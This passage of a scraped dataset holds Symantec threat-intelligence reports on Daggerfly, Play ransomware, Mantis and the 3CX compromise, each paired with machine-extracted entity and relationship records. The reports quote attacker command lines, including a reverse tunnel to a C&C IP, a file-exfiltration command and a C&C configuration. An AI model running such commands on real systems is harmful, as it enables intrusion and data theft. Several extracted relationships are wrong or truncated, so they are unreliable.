November 2022 were among the first signs of suspicious activity on the victim network targeted in this recent Daggerfly activity. AnyDesk is a legitimate remote desktop software but it is commonly abused by threat actors for remote access and other purposes. The WannaMine crypto-mining malware was also seen on the same Exchange server, though it appears likely that this activity was not linked to the Daggerfly group. The presence of WannaMine, however, does indicate that the server it was found on may have been unpatched and vulnerable to the EternalBlue exploit, as well as more recent exploits targeting this web server. The legitimate, free Rising antivirus software was also used to side-load the PlugX loader onto victim machines. We will go through the attack chain in further detail below. Threat actors used the living-off-the-land tools BITSAdmin and PowerShell to download files onto victim systems. The attackers downloaded the legitimate AnyDesk executable and the GetCredManCreds tool in this way. The attackers used the previously downloaded GetCredManCreds script to retrieve the usernames and passwords of web services stored in the credential manager using PowerShell. They also dumped the SAM (Security Account Manager), System, and Security hives of the Windows registry using the reg.exe tool. This allowed the adversaries to extract credentials from the SAM database. Persistence with local account Daggerfly also created a local account to maintain access to victim systems with the following command line: MgBot modular malware framework MgBot is a well-designed modular framework that is actively maintained. The components of the framework are the following: The MgBot plugins that were deployed in this activity have numerous capabilities that can provide the attackers with a significant amount of information about compromised machines. Among the unique plugins that were deployed during this activity were: All of these capabilities would have allowed the attackers to collect a significant amount of information from victim machines. The capabilities of these plugins also show that the main goal of the attackers during this campaign was information-gathering. Daggerfly’s development of these previously unseen plugins demonstrates that the attack group is continuing to actively develop its malware and the tools it can use to target victim networks. Telecoms companies will always be a key target in intelligence gathering campaigns due to the access they can potentially provide to the communications of end-users. Symantec’s Threat Hunter team also spotted some other recent activity targeting telecoms companies that was linked with moderate confidence to the threat actor Othorene (aka Gallium), in what appeared to be a continuation of an intelligence-gathering campaign first reported on bySentinelOne under the name Operation Tainted Love in March. SentinelOne reported that in that campaign Othorene was targeting telecoms companies in the Middle East. Othorene has been active since around 2014, and it is believed to be a relatively small group that has a strong focus on the surveillance of individuals. There are some indications that Othorene may have links with the APT41 (aka Blackfly, Grayfly) APT group also. Overlap of both personnel and tactics, techniques, and procedures (TTPs) among Chinese APT groups is not uncommon, and can mean that attributing activity to one group with high confidence is difficult. In the activity Symantec saw, we found three additional victims of the same campaign that SentinelOne detailed, located in Asia and Africa. Two of the three were subsidiaries of the same Middle Eastern telecoms firm. The attackers had been active on victim networks since November 2022. Symantec saw attackers dumping credentials and scanning the network using NbtScan. The main malware (pc.exe dubbed mim221) in this campaign was used to dump credentials, and it had the same password as the malware used in the activity documented by SentinelOne. The attackers also moved laterally across victims’ networks, used Scheduled Task for persistence, and dumped SAM and System hives from the registry. There were indications that the attackers may have exported the Active Directory database on victim machines, and they were also able to gain access to domain controllers, giving them deep access to victim networks. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. File Indicators – Daggerfly c89316e87c5761e0fc50db1214beb32a08c73d2cad9df8c678c8e44ed66c1dab 90e15eaf6385b41fcbf021ecbd8d86b8c31ba48c2c5c3d1edb8851896f4f72fe MgBot – aasrvd.dll, pmsrvd.dll 706c9030c2fa5eb758fa2113df3a7e79257808b3e79e46869d1bf279ed488c36 017187a1b6d58c69d90d81055db031f1a7569a3b95743679b21e44ea82cfb6c7 cb8aede4ad660adc1c78a513e7d5724cac8073bea9d6a77cf3b04b019395979a 2dcf9e556332da2a17a44dfceda5e2421c88168aafea73e2811d65e9521c715c a6ed16244a5b965f0e0b84b21dcc6f51ad1e413dc2ad243a6f5853cd9ac8da0b ee6a3331c6b8f3f955def71a6c7c97bf86ddf4ce3e75a63ea4e9cd6e20701024 585db6ab2f7b452091ddb29de519485027665335afcdb34957ff1425ecc3ec4b 29df6c3f7d13b259b3bc5d56f2cdd14782021fc5f9597a3ccece51ffac2010a0 ea2be3d0217a2efeb06c93e32f489a457bdea154fb4a900f26bef83e2053f4fd 54198678b98c2094e74159d7456dd74d12ab4244e1d9376d8f4d864f6237cd79 d9eec27bf827669cf13bfdb7be3fdb0fdf05a26d5b74adecaf2f0a48105ae934 cb7d9feda7d8ebfba93ec428d5a8a4382bf58e5a70e4b51eb1938d2691d5d4a5 2c0cfe2f4f1e7539b4700e1205411ec084cbc574f9e4710ecd4733fbf0f8a7dc a16a70b0a1ac0718149a31c780edb126379a0d375d9f6007a6def3141bec6810 0bcdcc0515d30c28017fd7931b8a787feebe9ee3819aa2b758ce915b8ba40f99 PlugX Loader –proccom.dll, djcu.dll c31b409b1fe9b6387b03f7aedeafd3721b4ec6d6011da671df49e241394da154 db489e9760da2ed362476c4e0e9ddd6e275a84391542a6966dbcda0261b3f30a 632cd9067fb32ac8fbbe93eb134e58bd99601c8690f97ca53e8e17dda5d44e0e DumpCredStore –dumpcredstore.ps1, a.ps1 c1e91a5f9cc23f3626326dab2dcdf4904e6f8a332e2bce8b9a0854b371c2b350 5a0976fef89e32ddcf62c790f9bb4c174a79004e627c3521604f46bf5cc7bea2 AnyDesk – anydesk.exe 7bcff667ab676c8f4f434d14cfc7949e596ca42613c757752330e07c5ea2a453 File Indicators – Othorene 3f75818e2e43a744980254bfdc1225e7743689b378081c560e824a36e0e0a195 – pc.exe, rpc.exe (Main malware) 1b8500e27edc87464b8e5786dc8c2beed9a8c6e58b82e50280cebb7f233bcde4 – get.exe (used to print Syskey and Samkey) 03bc62bd9a681bdcb85db33a08b6f2b41f853de84aa237ae7216432a6f8f817e – pc.dll ae39ced76c78e7c2043b813718e3cd610e1a8adac1f9ad5e69cf06bd6e38a5bd – pc.dll f6f6152db941a03e1f45d52ab55a2e3d774015ccb8828533654e3f3161cfcd21 – pc.exe 2f4a97dc70f06e0235796fec6393579999c224e144adcff908e0c681c123a8a2 – pc.dll 22069984cba22be84fe33a886d989b683de6eb09f001670dbd8c1b605460d454 – pc.dll 7b945fb1bdeb27a35fab7c2e0f5f45e0e64df7821dd1417a77922c9b08acfdc3 – rpc.dll e8be3e40f79981a1c29c15992da116ea969ab5a15dc514479871a50b20b10158 – pc.dl b5c46c2604e29e24c6eb373a7287d919da5c18c04572021f20b8e1966b86d585 – rpc.dll 53d2506723f4d69afca33e90142833b132ed11dd0766192a087cb206840f3692 – test.exe 26d129aaa4f0f830a7a20fe6317ee4a254b9caac52730b6fed6c482be4a5c79d – g.dll b45355c8b84b57ae015ad0aebfa8707be3f33e12731f7f8c282c8ee51f962292 – g.dll 17dce65529069529bcb5ced04721d641bf6d7a7ac61d43aaf1bca2f6e08ead56 – getHashFlsa64.dll 98b6992749819d0a34a196768c6c0d43b100ef754194308eae6aaa90352e2c13 – getHashFlsa64.dll 6d5be3e6939a7c86280044eebe71c566b48981a3341193aa3aff634a3a5d1bbd – getHashFlsa64.dll 1cf04c3e8349171d907b911bc2a23bdb544d88e2f9b8fcc516d8bcf68168aede – getHashFlsa64.dll The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Daggerfly, Attacker), (MgBot, Malware), (PlugX, Tool), (AnyDesk, Tool), (DLL, File), (Exchange, Domain), (Malwarebytes, Tool), (Evasive Panda, Attacker), (China, Country), (Symantec, Company), (Threat Hunter Team, Company), (Broadcom Software, Company), (Malwarebytes, Tool), (2020, Year), (2022, Year), (November, Month)\nRelationships: (Daggerfly, uses, MgBot), (Daggerfly, uses, PlugX), (Daggerfly, uses, AnyDesk), (Daggerfly, associatedWith, Malwarebytes), (Daggerfly, associatedWith, Evasive Panda), (Daggerfly, associatedWith, China), (Daggerfly, associatedWith, Symantec), (Daggerfly, associatedWith, Broadcom Software), (Daggerfly, associatedWith, Malwarebytes), (Daggerfly, associatedWith, 2020), (Daggerfly, associatedWith, 2022), (Daggerfly, associatedWith, November), (Daggerfly, associatedWith, Exchange), (Daggerfly, associatedWith, Malwarebytes), (Daggerfly, associatedWith, Evasive Panda), (Daggerfly, associatedWith, China), (Daggerfly,",
      "entities": [
        [
          "Daggerfly",
          "Attacker"
        ],
        [
          "MgBot",
          "Malware"
        ],
        [
          "PlugX",
          "Tool"
        ],
        [
          "AnyDesk",
          "Tool"
        ],
        [
          "DLL",
          "File"
        ],
        [
          "Exchange",
          "Domain"
        ],
        [
          "Malwarebytes",
          "Tool"
        ],
        [
          "Evasive Panda",
          "Attacker"
        ],
        [
          "China",
          "Country"
        ],
        [
          "Symantec",
          "Company"
        ],
        [
          "Threat Hunter Team",
          "Company"
        ],
        [
          "Broadcom Software",
          "Company"
        ],
        [
          "Malwarebytes",
          "Tool"
        ],
        [
          "2020",
          "Year"
        ],
        [
          "2022",
          "Year"
        ],
        [
          "November",
          "Month"
        ]
      ],
      "relationships": [
        [
          "Daggerfly",
          "uses",
          "MgBot"
        ],
        [
          "Daggerfly",
          "uses",
          "PlugX"
        ],
        [
          "Daggerfly",
          "uses",
          "AnyDesk"
        ],
        [
          "Daggerfly",
          "associatedWith",
          "Malwarebytes"
        ],
        [
          "Daggerfly",
          "associatedWith",
          "Evasive Panda"
        ],
        [
          "Daggerfly",
          "associatedWith",
          "China"
        ],
        [
          "Daggerfly",
          "associatedWith",
          "Symantec"
        ],
        [
          "Daggerfly",
          "associatedWith",
          "Broadcom Software"
        ],
        [
          "Daggerfly",
          "associatedWith",
          "Malwarebytes"
        ],
        [
          "Daggerfly",
          "associatedWith",
          "2020"
        ],
        [
          "Daggerfly",
          "associatedWith",
          "2022"
        ],
        [
          "Daggerfly",
          "associatedWith",
          "November"
        ],
        [
          "Daggerfly",
          "associatedWith",
          "Exchange"
        ],
        [
          "Daggerfly",
          "associatedWith",
          "Malwarebytes"
        ],
        [
          "Daggerfly",
          "associatedWith",
          "Evasive Panda"
        ],
        [
          "Daggerfly",
          "associatedWith",
          "China"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 16,
    "relationship_count": 16
  },
  {
    "title": "play ransomware volume shadow copy",
    "link": "https://www.security.com/threat-intelligence/play-ransomware-volume-shadow-copy",
    "content": "The Play ransomware group is using two new, custom-developed tools that allow it to enumerate all users and computers on a compromised network, and copy files from the Volume Shadow Copy Service (VSS) that are normally locked by the operating system. The first tool found by researchers at Symantec, byBroadcom Software,was Grixba (Infostealer.Grixba), which is a network-scanning tool used to enumerate all users and computers in the domain. The threat actors use the .NET infostealer to enumerate software and services via WMI, WinRM, Remote Registry, and Remote Services. The malware checks for the existence of security and backup software, as well as remote administration tools and other programs, saving the gathered information in CSV files that are compressed into a ZIP file for subsequent manual exfiltration by the threat actors. The Play ransomware gang developed Grixba usingCostura, a popular.NET development tool for embedding an application's dependencies into a single executable file. This eliminates the requirement for the program and its dependencies to be deployed separately, making it easier to share and deploy the application. Costura embeds into applications the DLL file costura.commandline.dll, which is used by Grixba to parse command lines. An analysis of a Grixba sample by Symantec revealed the following help message and functionality: The Scanall mode enumerates software and services via WMI, WinRM, Remote Registry, and Remote Services. It then checks for the existence of the following security programs: It also checks for the existence of the following backup software: It then checks for the existence of the following remote administration tools: Finally, it checks for the presence any of the following programs: The malware then saves all the information in CSV files and, using WinRAR, compresses them to a file named export.zip. List of CSV files compressed by Grixba: Scan mode is similar to Scanall mode, but scans for a subset of the programs covered by Scanall mode. Clr mode deletes the logs from local and remote computers. It also enumerates the following registry keys: SYSTEM\\\\CurrentControlSet\\\\services\\\\eventlog SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WINEVT\\\\Channels It uses the APIs \"EvtOpenLog\" and \"EvtClearLog\" to delete the logs and deletes the WMI activity logs from the event source \"Microsoft-Windows-WMI-Activity\". The Play ransomware gang was also recently observed using another .NET executable, which was also developed with the Costura tool. Costura embeds the libraryAlphaVSSinto executables. The AlphaVSS library is a.NET framework that provides a high-level interface for interacting with VSS. The library makes it easier for .NET programs to interface with VSS by offering a set of controlled APIs. Developers can use these APIs to generate, manage, and delete shadow copies, as well as access information about existing shadow copies such as size and status. The tool created by the Play ransomware operators uses AlphaVSS to copy files from VSS snapshots. The tool enumerates the files and folders in a VSS snapshot and copies them to a destination directory. The tool allows the attackers to copy files from VSS volumes on compromised machines prior to encryption. This allows the threat actors to copy files that would normally be locked by the operating system. Play ransomware (also known as PlayCrypt), which is developed by a group Symantec tracks as Balloonfly, was launched in June 2022, and since then has been responsible for multiple high-profile attacks. Like most ransomware groups now, Play carries out double-extortion attacks, where the attackers exfiltrate data from victim networks before encrypting them. While the ransomware gang had an initial focus on organizations in Latin America, especially Brazil, it soon widened its targeting. Play is known for targeting Microsoft Exchange vulnerabilities (CVE-2022-41080,CVE-2022-41082), as well as other flaws, to gain remote code execution (RCE) and infiltrate victim networks. The group was also one of the first ransomware groups to employintermittent encryption, a technique that allows for faster encryption of victims’ systems. The tactic consists of encrypting only parts of the targeted files' content, which would still render the data unrecoverable. Play is also notable as it doesn’t appear to operate as a ransomware-as-a-service, with Balloonfly seemingly carrying out the ransomware attacks as well as developing the malware. Custom tools are increasingly being used by ransomware gangs in their attacks. This is likely due to a number of reasons, such as making attacks more efficient and reducing dwell time. Custom tools can be tailored to a specific target environment, allowing ransomware gangs to carry out attacks faster and more efficiently. The use of proprietary tools also gives ransomware operators more control over their operations. If a tool is widely available, it can be reverse-engineered or adapted by other attackers, potentially weakening the initial attack's effectiveness. By keeping their tools proprietary and exclusive, ransomware gangs can maintain their competitive advantage and maximize their profits. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 762bb8a7209da29afb89f7941ae1c00a04cf45a144c6c5dddcfa78ff0d941539 – Play ransomware 86e4e23f9686b129bfb2f452acb16a4c0fda73cf2bf5e93751dcf58860c6598c – SystemBC malware f706bae95a232402488d17016ecc11ebe24a8b6cb9f10ad0fa5cbac0f174d2e7 – SystemBC malware c59f3c8d61d940b56436c14bc148c1fe98862921b8f7bad97fbc96b31d71193c – Infostealer.Grixba 453257c3494addafb39cb6815862403e827947a1e7737eb8168cd10522465deb – Infostealer.Grixba f71476f9adec70acc47a911a0cd1d6fea1f85469aa16f5873dd3ffd5146ccd6b – Infostealer.Grixba a8a7fdbbc688029c0d97bf836da9ece926a85e78986d0e1ebd9b3467b3a72258 – NetScan 5ef9844903e8d596ac03cc000b69bbbe45249eea02d9678b38c07f49e4c1ec46 – NetScan f81bd2ac937ed9e254e8b3b003cc35e010800cbbce4d760f5013ff911f01d4f9 – VSS copying tool 367d47ad48822caeedf73ce9f26a3a92db6f9f2eb18ee6d650806959b6d7d0a2 – WinRAR 6f95f7f53b3b6537aeb7c5f0025dbca5e88e6131b7453cfb4ee4d1f11eeaebfc – WinSCP 1409e010675bf4a40db0a845b60db3aae5b302834e80adeec884aebc55eccbf7 – PsExec 137.220[.]49.66 – SystemBC C&C justiceukraine.com – SystemBC C&C The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Play ransomware group, Attacker), (Grixba, Malware), (.NET infostealer, Tool), (Volume Shadow Copy Service, Tool), (Symantec, Organization), (Costura, Tool), (costura.commandline.dll, Tool), (WMI, Tool), (WinRM, Tool), (Remote Registry, Tool), (Remote Services, Tool), (Play ransomware gang, Attacker), (Grixba, Malware), (Costura, Tool), (DLL file, File)\nRelationships: (Play ransomware group, uses, Grixba), (Play ransomware group, develops, Costura), (Grixba, contains, costura.commandline.dll), (Play ransomware group, uses, WMI), (Play ransomware group, uses, WinRM), (Play ransomware group, uses, Remote Registry), (Play ransomware group, uses, Remote Services), (Grixba, executes, Scanall mode), (Grixba, helps, Scanall mode), (Symantec, analyzed, Grixba), (Symantec, analyzed, Play ransomware group), (Play ransomware gang, uses, Grixba), (Play ransomware gang, develops, Costura), (Play ransomware gang, uses, DLL file)",
      "entities": [
        [
          "Play ransomware group",
          "Attacker"
        ],
        [
          "Grixba",
          "Malware"
        ],
        [
          ".NET infostealer",
          "Tool"
        ],
        [
          "Volume Shadow Copy Service",
          "Tool"
        ],
        [
          "Symantec",
          "Organization"
        ],
        [
          "Costura",
          "Tool"
        ],
        [
          "costura.commandline.dll",
          "Tool"
        ],
        [
          "WMI",
          "Tool"
        ],
        [
          "WinRM",
          "Tool"
        ],
        [
          "Remote Registry",
          "Tool"
        ],
        [
          "Remote Services",
          "Tool"
        ],
        [
          "Play ransomware gang",
          "Attacker"
        ],
        [
          "Grixba",
          "Malware"
        ],
        [
          "Costura",
          "Tool"
        ],
        [
          "DLL file",
          "File"
        ]
      ],
      "relationships": [
        [
          "Play ransomware group",
          "uses",
          "Grixba"
        ],
        [
          "Play ransomware group",
          "develops",
          "Costura"
        ],
        [
          "Grixba",
          "contains",
          "costura.commandline.dll"
        ],
        [
          "Play ransomware group",
          "uses",
          "WMI"
        ],
        [
          "Play ransomware group",
          "uses",
          "WinRM"
        ],
        [
          "Play ransomware group",
          "uses",
          "Remote Registry"
        ],
        [
          "Play ransomware group",
          "uses",
          "Remote Services"
        ],
        [
          "Grixba",
          "executes",
          "Scanall mode"
        ],
        [
          "Grixba",
          "helps",
          "Scanall mode"
        ],
        [
          "Symantec",
          "analyzed",
          "Grixba"
        ],
        [
          "Symantec",
          "analyzed",
          "Play ransomware group"
        ],
        [
          "Play ransomware gang",
          "uses",
          "Grixba"
        ],
        [
          "Play ransomware gang",
          "develops",
          "Costura"
        ],
        [
          "Play ransomware gang",
          "uses",
          "DLL file"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 15,
    "relationship_count": 14
  },
  {
    "title": "mantis palestinian attacks",
    "link": "https://www.security.com/threat-intelligence/mantis-palestinian-attacks",
    "content": "The Mantis cyber-espionage group (aka Arid Viper, Desert Falcon, APT-C-23), a threat actor believed to be operating out of the Palestinian territories,is continuing to mount attacks, deploying a refreshed toolset and going to great lengths to maintain a persistent presence on targeted networks. While the group is known for targeting organizations in the Middle East, the most recent campaign uncovered by Symantec, byBroadcom Software, focused on organizations within the Palestinian territories, with malicious activity beginning in September 2022 and continuing to at least February 2023. This targeting is not unprecedented for Mantis and Symantec previously uncovered attacks against individuals located in the Palestinian territories during 2017. Mantis has been active since at least 2014, with some third-party reporting suggesting it may have been active as early as 2011. The group is known to target organizations in Israel and a number of other Middle Eastern countries. Sectors targeted include government, military, financial, media, education, energy, and think tanks. The group is known for employing spear-phishing emails and fake social media profiles to lure targets into installing malware on their devices. Mantis is widely accepted to be linked to the Palestinian territories. Whileother vendors have linked the group to Hamas, Symantec cannot make a definitive attribution to any Palestinian organization. In its most recent attacks, the group used updated versions of its custom Micropsia and Arid Gopher backdoors to compromise targets before engaging in extensive credential theft and exfiltration of stolen data. The initial infection vector for this campaign remains unknown. In one organization targeted, a feature of the compromise was that the attackers deployed three distinct versions of the same toolset (i.e. different variants of the same tools) on three groups of computers. Compartmentalizing the attack in this fashion was likely a precautionary measure. If one toolset was discovered, the attackers would still have a persistent presence on the target’s network. The following is a description of how one of those three toolsets was used: The first evidence of malicious activity occurred on December 18, 2022. Three distinct sets of obfuscated PowerShell commands were executed to load a Base64-encoded string, which started embedded shellcode. The shellcode was a 32-bit stager that downloaded another stage using basic TCP-based protocol from a command-and-control (C&C) server: 104.194.222[.]50 port 4444. The attackers returned on December 19 to dump credentials before downloading the Micropsia backdoor and Putty,a publicly available SSH client, using Certutil and BITSAdmin Micropsia subsequently executed and initiated contact with a C&C server. On the same day, Micropsia also executed on three other machines in the same organization. In each case, it ran in a folder named after its file name: On one computer, Micropsia was used to set up a reverse socks tunnel to an external IP address: CSIDL_COMMON_APPDATA\\windowsservicemanageav\\windowsservicemanageav.exe -connect 104.194.222[.]50:443 [REDACTED] On December 20, Micropsia was used to run an unknown executable named windowspackages.exe on one of the infected computers. The following day, December 21, RAR was executed to archive files on another infected computer. Between December 22 and January 2, 2023, Micropsia was used to execute the Arid Gopher backdoor on three infected computers. Arid Gopher was in turn used to run a tool called SetRegRunKey.exe that provided persistence by adding Arid Gopher to the registry so that it executed on reboot. It also ran an unknown file named localsecuritypolicy.exe (this file name was used for the Arid Gopher backdoor elsewhere by the attackers). On December 28, Micropsia was used to run windowspackages.exe on three more infected computers. On December 31, Arid Gopher executed two unknown files named networkswitcherdatamodell.exe and networkuefidiagsbootserver.exe on two of the infected computers. On January 2, the attackers retired the version of Arid Gopher they were using and introduced a new variant. Whether this was because the first version was discovered or whether it was standard operating procedure is unclear. On January 4, Micropsia was used to execute two unknown files, both named hostupbroker.exe, on a single computer from the folder: csidl_common_appdata\\hostupbroker\\hostupbroker.exe. This was immediately followed by the exfiltration of a RAR file: CSIDL_COMMON_APPDATA\\windowsupserv\\windowsupserv.exe -f CSIDL_COMMON_APPDATA\\windowspackages\\01-04-2023-15-13-39_getf.rar On January 9, Arid Gopher was used to execute two unknown files on a single computer: The last malicious activity occurred from January 12 onwards when Arid Gopher was used to execute the unknown file named localsecuritypolicy.exe every ten hours. Variants of the Micropsia backdoor used in these attacks appear to be slightly updated versions of those seen by other vendors. In this campaign, Micropsia was deployed using multiple file names and file paths: Micropsia is executed using WMI and its main purpose appears to be running secondary payloads for the attackers. These included: In addition to this, Micropsia has its own functionality, such as taking screenshots, keylogging, and archiving certain file types using WinRAR in preparation for data exfiltration: \"%PROGRAMDATA%\\Software Distributions\\WinRAR\\Rar.exe\" a -r -ep1 -v2500k -hp71012f4c6bdeeb73ae2e2196aa00bf59_d01247a1eaf1c24ffbc851e883e67f9b -ta2023-01-14 \"%PROGRAMDATA%\\Software Distributions\\Bdl\\LMth__C_2023-02-13 17-14-41\" \"%USERPROFILE%\\*.xls\" \"%USERPROFILE%\\*.xlsx\" \"%USERPROFILE%\\*.doc\" \"%USERPROFILE%\\*.docx\" \"%USERPROFILE%\\*.csv\" \"%USERPROFILE%\\*.pdf\" \"%USERPROFILE%\\*.ppt\" \"%USERPROFILE%\\*.pptx\" \"%USERPROFILE%\\*.odt\" \"%USERPROFILE%\\*.mdb\" \"%USERPROFILE%\\*.accdb\" \"%USERPROFILE%\\*.accde\" \"%USERPROFILE%\\*.txt\" \"%USERPROFILE%\\*.rtf\" \"%USERPROFILE%\\*.vcf\" Unlike Micropsia, which is written in Delphi, Arid Gopher is written in Go. Versions of Arid Gopher used in this campaign contain the following embedded components: Arid Gopher was also used to launch the following unknown files: networkswitcherdatamodell.exe, localsecuritypolicy.exe, and networkuefidiagsbootserver.exe, in addition to being used to download and execute files obfuscated with PyArmor. When communicating with a C&C server, Arid Gopher registers a device on one path then connects to another path, likely to receive commands: Arid Gopher appears to be regularly updated and rewritten by the attackers, most likely in order to evade detection. One variant of the malware was radically different from previous versions seen with most of the distinctive code updated, so much so that there was not a single subroutine that contained identical distinctive code when compared with the previous version. Mantis appeared to be aggressively mutating the logic between variants, which is a time-intensive operation if done manually. The embedded setup.env file used by one analyzed variant of Arid Gopher to retrieve configuration data contained the following: DIR=WindowsPerceptionService ENDPOINT=http://jumpstartmail[.]com/IURTIER3BNV4ER BW_TOO_ID=7463b9da-7606-11ed-a1eb-0242ac120002 SERVER_TOKEN=PDqMKZ91l2XDmDELOrKB STAPP=AttestationWmiProvider.exe SHORT_APP=ServiceHubIdentityHost.exe The setup.env configuration file mentions another file, AttestationWmiProvider.exe, which is also embedded in Arid Gopher. The file is a 32-bit executable that is used as a helper to ensure that another executable will run on reboot. When it executes, it checks for the following command-line arguments: \"key\" with string parameter [RUN_VALUE_NAME] \"value\" with string parameter [RUN_PATHNAME] It then arranges to receive notification on a signal using func os/signal.Notify(). Once notified, it sets the following registry value: HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\"[RUN_VALUE_NAME]\" = \"[RUN_PATHNAME]\" Our investigation so far shows this file setting Arid Gopher to run on reboot: CSIDL_COMMON_APPDATA\\attestationwmiprovider\\attestationwmiprovider.exe -key=NetworkVirtualizationStartService \"-value=CSIDL_COMMON_APPDATA\\networkvirtualizationstartservice\\networkvirtualizationstartservice.exe -x\" The attackers also used a custom tool to exfiltrate data stolen from targeted organizations: a 64-bit PyInstaller executable named WindowsUpServ.exe. When run, the tool checks for the following command-line arguments: \"-d\" \"[FILE_DIRECTORY]\" For each \"-f\" \"[FILENAME]\" command-line argument, the tool uploads the content of [FILENAME]. For each \"-d\" \"[FILE_DIRECTORY]\" command-line argument, the tool obtains a list of files stored in the folder [FILE_DIRECTORY] and uploads the content of each file. When uploading each file, the tools sends an HTTP POST request to a C&C server with the following parameters: \"kjdfnqweb\": [THE_FILE_CONTENT] \"qyiwekq\": [HOSTNAME_OF_THE_AFFECTED_COMPUTER] Whenever the remote server responds with the status code 200, the malware deletes the uploaded file from the local disk. The malware may also log some of its actions in the following files: \"C:\\ProgramData\\WindowsUpServ\\success.txt\" \"C:\\ProgramData\\WindowsUpServ\\err.txt\" Mantis appears to be a determined adversary, willing to put time and effort into maximizing its chances of success, as evidenced by extensive malware rewriting and its decision to compartmentalize attacks against single organizations into multiple separate strands to reduce the chances of the entire operation being detected. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Mantis cyber-espionage group, Attacker), (Arid Viper, aka), (Desert Falcon, aka), (APT-C-23, Attacker), (Spear-phishing, Technique), (fake social media profile, Technique), (Israel, Target), (Middle East, Target), (government, Sector), (financial, Sector), (media, Sector), (education, Sector), (energy, Sector), (think tanks, Sector), (Hamas, Linked To)\nRelationships: (Mantis cyber-espionage group, uses, Arid Viper), (Mantis cyber-espionage group, uses, Desert Falcon), (Mantis cyber-espionage group, uses, APT-C-23), (Mantis cyber-espionage group, employs, spear-phishing), (Mantis cyber-espionage group, employs, fake social media profile)",
      "entities": [
        [
          "Mantis cyber-espionage group",
          "Attacker"
        ],
        [
          "Arid Viper",
          "aka"
        ],
        [
          "Desert Falcon",
          "aka"
        ],
        [
          "APT-C-23",
          "Attacker"
        ],
        [
          "Spear-phishing",
          "Technique"
        ],
        [
          "fake social media profile",
          "Technique"
        ],
        [
          "Israel",
          "Target"
        ],
        [
          "Middle East",
          "Target"
        ],
        [
          "government",
          "Sector"
        ],
        [
          "financial",
          "Sector"
        ],
        [
          "media",
          "Sector"
        ],
        [
          "education",
          "Sector"
        ],
        [
          "energy",
          "Sector"
        ],
        [
          "think tanks",
          "Sector"
        ],
        [
          "Hamas",
          "Linked To"
        ]
      ],
      "relationships": [
        [
          "Mantis cyber-espionage group",
          "uses",
          "Arid Viper"
        ],
        [
          "Mantis cyber-espionage group",
          "uses",
          "Desert Falcon"
        ],
        [
          "Mantis cyber-espionage group",
          "uses",
          "APT-C-23"
        ],
        [
          "Mantis cyber-espionage group",
          "employs",
          "spear-phishing"
        ],
        [
          "Mantis cyber-espionage group",
          "employs",
          "fake social media profile"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 15,
    "relationship_count": 5
  },
  {
    "title": "3cx supply chain attack",
    "link": "https://www.security.com/threat-intelligence/3cx-supply-chain-attack",
    "content": "UPDATE March 31 2023 14:26 UTC:Our blog has been updated with a Yara rule to detect the final infostealer payload. UPDATE March 30 2023 17:39 UTC:Our blog has been updated with technical analysis of the macOS versions. UPDATE March 30 2023 14:17 UTC:Our blog has been updated with  additional IOCs UPDATE March 30 2023 12:47 UTC:Our blog has been updated with additional IOCs and protection information. UPDATE March 30 2023 9:07 UTC:Our blog has been updated with technical analysis of the malware used. Attackers believed to be linked to North Korea have Trojanized 3CX's DesktopApp, a widely-used voice and video calling desktop client. In an attackreminiscent of SolarWinds, installers for several recent Windows and Mac versions of the software were compromised and modified by the attackers in order to deliver additional information stealing malware to the user’s computer. The information gathered by this malware presumably allowed the attackers to gauge if the victim was a candidate for further compromise. The attackers compromised installer files for at least two Windows versions (18.12.407 and 18.12.416) and two Mac versions (8.11.1213 and latest) of 3CX DesktopApp. The installers contained clean versions of the app along with malicious DLLs. The app was used to sideload the malicious DLLs, which then installed information-stealing malware on the computer. In two variants analyzed by Symantec (SHA256: aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868 and 59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983), the clean executable was used to load a malicious DLL named ffmpeg.dll (SHA256: 7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896) This DLL contains code that will load and execute a payload from a second DLL named d3dcompiler_47.dll. (SHA256: 11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03) D3dcompiler_47.dll contains an encrypted blob appended to the file, suggesting that it is possibly a Trojanized version of a legitimate file. The blob starts with the hex value “FEEDFACE” which the loader uses to find the blob. The decrypted blob contains shellcode and a third DLL (SHA256: aa4e398b3bd8645016d8090ffc77d15f926a8e69258642191deb4e68688ff973). The shellcode loads and executes this third DLL, export DLLGetClassObject with parameters: It will then attempt to download an ICO file from the following GitHub repository: At last two macOS versions of the affected software were compromised in a similar fashion. In this case a dynamic library named libffmpeg.dylib was Trojanized. There are at least two variants of this file (SHA256: a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67 and fee4f9dabc094df24d83ec1a8c4e4ff573e5d9973caa676f58086c99561382d7) and they seem to relate to different versions of the software. The malicious code is in the InitFunc_0 function of libffmpeg.dylib, it calls _run_avcodec which starts a thread, in this thread it decodes some shellcode with XOR key 0x7A and then will make a http request. It attempts to download a payload from: The following URLs were embedded in analyzed variants: 3CX is aware of the compromise and is advising users to immediately uninstall the app. It said that it is working on an update to the software that will be released within hours. It advised users to consider using its PWA client as an alternative until a clean 